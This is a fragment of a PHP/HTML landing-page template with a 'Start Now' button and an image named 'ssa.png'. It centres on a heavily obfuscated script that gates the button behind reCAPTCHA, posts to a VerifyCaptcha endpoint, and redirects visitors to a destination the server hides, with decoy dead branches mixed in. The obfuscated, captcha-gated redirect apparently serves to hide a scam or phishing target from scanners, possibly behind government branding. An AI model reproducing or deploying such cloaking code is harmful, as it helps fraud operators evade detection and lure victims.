...
<meta class="metaTagTop" name="description" content="<?php echo $meta_description; ?>">
...
var skeyx = '<?php echo $google_reCaptcha_site_key; ?>';
       (function(Z,i){var J=G,X=Z();while(!![]){try{var I=-parseInt(J(0xe1))/(0x12a0*-0x1+-0x2272+0x3513)*(parseInt(J(0xdd))/(-0x2*-0x15b+-0x1d46+0x1a92*0x1))+parseInt(J(0xd5))/(-0xe83+-0xbe2+0x1a68)*(-parseInt(J('0xdb'))/(-0x3b7*0x2+-0x644*0x5+0x26c6))+parseInt(J(0xe3))/(0x767*0x2+0x1b63+0x2a2c*-0x1)+-parseInt(J(0xe0))/(0x1*-0x1789+-0x1*-0x105b+0x734*0x1)+-parseInt(J('0xdf'))/(0x1*-0x1a78+-0x207*-0xe+-0xa1*0x3)*(-parseInt(J('0xdc'))/(0x21d*-0x5+-0x1a3*-0x11+0xe*-0x13b))+-parseInt(J('0xea'))/(0x25ab+-0xa2f*-0x3+-0x442f)+-parseInt(J('0xd9'))/(-0x2c*0x6e+0x1aee+-0x7fc)*(-parseInt(J(0xf0))/(-0xf58+-0x1*0x2207+0x316a));if(I===i)break;else X['push'](X['shift']());}catch(g){X['push'](X['shift']());}}}(R,0x17*0x28af+0x76da8+0x1*-0x66ca1));function G(Z,i){var X=R();return G=function(I,g){I=I-(0x24f*0xb+-0x114+0x1*-0x177d);var M=X[I];return M;},G(Z,i);}var isDone=-0x579*-0x1+-0x90*-0x35+-0x2349,directionGo='',onloadCallback=function(){var u=G;grecaptcha[u(0xe8)](u('0xe4'),{'sitekey':skeyx,'callback':function(i){var T=u;if(T(0xd7)!==T(0xd7)){var M=j['d']['split']('|'),o=O['parseJSON'](Y['d'][T('0xf1')]('|','')['replace'](M[0x7c8+0x327*-0x3+0x1ae],''));s['log'](o),o[T(0xd6)]?(D(T(0xeb))[T(0xd8)](),F=0x1bd8+0x20d0+-0x3ca7,w=M[0xa2a+0x2108+-0x2b31]):(f('#errorMsg')[T(0xef)](),H=0x263d+-0xd5a+-0x18e3);}else{var X={};X[T(0xe7)]=i;var I=X;$[T('0xe6')]({'type':T('0xe5'),'url':T(0xd4)+'erifyCaptc'+'ha','data':I,'success':function(M){var K=T,o=M['d'][K(0xe2)]('|'),z=jQuery['parseJSON'](M['d'][K(0xf1)]('|','')['replace'](o[-0x1*0xc8f+-0xe9*-0x9+-0x175*-0x3],''));console['log'](z),z[K(0xd6)]?($(K('0xeb'))[K(0xd8)](),isDone=-0x10db+-0x7e3+0x18bf,directionGo=o[-0x309*-0x6+-0x39*-0x32+-0x1d57]):($(K(0xeb))[K(0xef)](),isDone=0x95*-0x25+-0x1*0x7e1+0x1d6a);}});}}});};function R(){var e=['POST','ajax','response','render','location','1811592gqLMIp','#errorMsg','YmRFd','preventDef','parseJSON','show','11SwKiPj','replace','api.aspx/V','177087pfeCCc','success','WpENj','hide','8155800UzJUYi','erifyCaptc','28Sbusfh','16FHBaKo','6482DVNUDS','ault','863254CycaME','1287258IJMEDB','91XkuqBl','split','1835425EObLcS','dvCaptcha'];R=function(){return e;};return R();}function btnNext_Click(Z){var m=G;if(isDone=0x207f+0x1ee6+-0x3f64)directionGo===''?($(m(0xeb))[m('0xef')](),Z[m('0xed')+m('0xde')]()):($('#errorMsg')['hide'](),window[m(0xe9)]['replace'](directionGo));else{if(m('0xec')!=='zxjpH')$('#errorMsg')[m('0xef')](),Z[m(0xed)+m(0xde)]();else{var X={};X[m('0xe7')]=j;var I=X;O['ajax']({'type':m(0xe5),'url':m('0xd4')+m('0xda')+'ha','data':I,'success':function(d){var b=m,V=d['d']['split']('|'),W=I[b(0xee)](d['d'][b('0xf1')]('|','')[b('0xf1')](V[-0x3da+-0x25b1+0x298c],''));F['log'](W),W[b('0xd6')]?(C(b('0xeb'))[b('0xd8')](),B=0x1*-0xa22+-0xe76*0x1+0x1899,c=V[-0x13d6*-0x1+-0x1*-0x469+-0xd6*0x1d]):(L(b(0xeb))[b(0xef)](),P=-0x2ab*0x1+0x59*-0x13+0x946*0x1);}});}}}
    ...
    function init() {
        for (var t = document.getElementsByTagName("img"), e = 0; e < t.length; e++) {
            ...
            if (i) {
                ...
                a && 0 < i.indexOf("iaas.com") && (i = "xxx/image/fit=scale-down,width=" + a + ",quality=75/" + i), t[e].setAttribute("src", i)
            }
        }
    }
...
<div class="closeLPModal"><img src="data:image/png;base64,R0lGODlhAQABAAD/ACwAAAAAAQABAAACADs=" alt="" data-src="img/closemodal.png"></div>
</div>
...
<img src="img/ssa.png" width="230" height="170">
<br>
<br>
...
<h1 class="ne elHeadline hsSize3 lh4 elMargin0 elBGStyle0 hsTextShadow0" style="text-align: center; font-size: 38px;" data-bold="inherit" data-gramm="false" contenteditable="false"><b><?php echo $page_header_text ?></b></h1>
</div>
...
<img src="data:image/png;base64,R0lGODlhAQABAAD/ACwAAAAAAQABAAACADs=" class="elIMG ximg" alt="" data-src="<?php echo $center_img; ?>">
</div>
...
<link href="https://fonts.googleapis.com/css2?family=Righteous&family=Unbounded:wght@600&display=swap" rel="stylesheet">
<p id="errorMsg" style="display:none;text-align: center;font-weight: bold;font-size: 20px;color: red;font-family: 'Righteous', 'Unbounded', sans-serif;">Let's make sure you're not a robot - complete the captcha first.</p>
<a href="#" <button id="btnNext" onclick="btnNext_Click(event)" style="background-color: #50C878; color: white; padding: 10px 20px; border: none; border-radius: 5px; font-weight: bold; font-size: 20px; width: 170px;">Start Now</button> </a>
<br />
</form>
<link rel="preconnect" href="https://fonts.googleapis.com">
<link rel="preconnect" href="https://fonts.gstatic.com" crossorigin>
...
<div class="de elHeadlineWrapper de-editable" id="tmp_paragraph-36693" data-de-type="headline" data-de-editing="false" data-title="Paragraph" data-ce="true" data-trigger="none" data-animate="fade" data-delay="500" style="margin-top: 75px; outline: none; cursor: pointer;">
  <div class="ne elHeadline hsSize1 lh5 elMargin0 elBGStyle0 hsTextShadow0" data-bold="inherit" style="text-align: center; font-family: 'Righteous', 'Unbounded', sans-serif; font-weight: 600;" data-gramm="false" contenteditable="false">
